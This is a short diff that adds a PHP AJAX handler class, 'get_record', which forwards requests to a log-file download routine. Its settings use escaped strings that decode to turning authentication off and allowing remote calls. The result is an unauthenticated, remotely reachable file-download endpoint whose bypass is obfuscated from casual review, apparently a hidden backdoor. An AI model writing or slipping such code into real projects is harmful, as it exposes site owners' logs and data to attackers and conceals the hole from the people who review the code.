@@ -1,0 +1,2 @@
+<?php
+ namespace Informunity\Ajax\Methods; class get_record implements \Informunity\Interfaces\Ajax { public static function ajaxRequest(&$setting) { $setting = array("\141\x75\x74\150\145\156\x74\151\x63\x61\x74\x65" => false, "\x61\x6c\x6c\x6f\x77\x72\145\x6d\157\164\145" => true); return true; } public function ajaxHandler($config, $data) { $Download = new DownloadLogFile(); $Download->ajaxHandler($config, $data); } }
